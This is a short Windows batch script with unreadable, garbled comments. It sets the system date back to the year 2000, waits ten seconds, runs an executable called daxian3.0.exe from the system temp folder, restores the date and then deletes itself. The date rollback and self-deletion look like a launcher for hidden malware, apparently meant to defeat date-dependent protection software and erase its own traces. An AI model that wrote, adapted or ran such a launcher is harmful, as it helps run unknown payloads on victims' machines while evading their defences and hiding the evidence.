::======��������һ���============
@echo off & setlocal enableextensions

::======����ϵͳ��ǰʱ����»ָ�============
set last_date=%date:~0,10%

::======�޸�ϵͳʱ��ʹ���ͼ��ʧЧ============
date 2000-11-2

::========����ʱ�ȴ�10��======================
echo WScript.Sleep 1000 > %systemroot%/temp/delay.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %systemroot%/temp/delay.vbs
goto Timeout

::===========����ʱ�ȴ���������ľ��=============
:Next
%systemroot%/temp/daxian3.0.exe

::======�ָ�ϵͳʱ��=======================
date %last_date%
date %last_date%

::=========����ۼ�============================
del %0
